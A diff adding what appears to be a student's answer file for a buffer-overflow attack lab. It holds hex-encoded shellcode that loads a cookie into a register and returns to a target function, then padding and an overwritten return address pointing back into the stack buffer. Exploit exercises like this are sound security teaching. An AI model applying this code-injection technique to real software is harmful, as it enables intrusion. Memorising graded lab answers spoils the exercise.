@@ -1,0 +1,13 @@
+/* start of the buffer with lower address */
+bf e4 44 60 00       /*	mov    $0x6044e4,%edi (cookie is stored in this addr) */
+48 8b 3f             /*	mov    (%rdi),%rdi */
+68 ec 17 40 00       /*	pushq  $0x4017ec */
+c3                   /*	retq */
+/* 14 bytes */
+                  30 30 
+30 30 30 30 30 30 30 30  /* eight dumpy chars */
+30 30 30 30 30 30 30 30  
+30 30 30 30 30 30 30 30  /* buffer size is 0x28=40 */
+/* end of buffer with higher address */
+
+78 dc 61 55 /* address of the start of the buffer (using gdb to print out $rsp) */
